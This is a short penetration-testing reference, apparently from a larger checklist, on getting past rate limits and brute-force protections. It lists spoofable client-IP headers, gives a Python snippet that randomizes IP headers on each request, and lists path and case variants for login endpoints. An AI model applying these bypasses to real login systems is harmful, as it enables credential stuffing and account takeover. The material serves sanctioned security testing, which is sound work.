# Rate Limiting & IP Header Spoofing Reference

When testing for brute force protections, credential stuffing defenses, or 2FA verification limits (Checks 09, 10, 30), reverse proxies and web application firewalls (WAFs) often evaluate client IP addresses using untrusted HTTP headers.

---

## 1. Rate-Limit Header Spoofing Matrix
Inject or rotate the following headers to test if upstream origin servers rely on spoofable proxy headers instead of the true TCP connection socket:

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1;by=127.0.0.1;host=127.0.0.1
```

---

## 2. Dynamic IP Rotation Automation
In Turbo Intruder or Python automation, randomize the header value per request:

```python
import random

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

headers = {
    "X-Forwarded-For": random_ip(),
    "X-Client-IP": random_ip()
}
```

---

## 3. Path & Case Variation Bypasses
Rate limiters configured at edge gateways frequently perform case-sensitive path matching:

- `/login` vs `/Login` vs `/LOGIN`
- `/api/v1/auth/login` vs `/api/v1/auth/login/` vs `/api/v1/auth/login.json`
- `/login%20` or `/login%09` (HTTP parameter pollution/normalization)
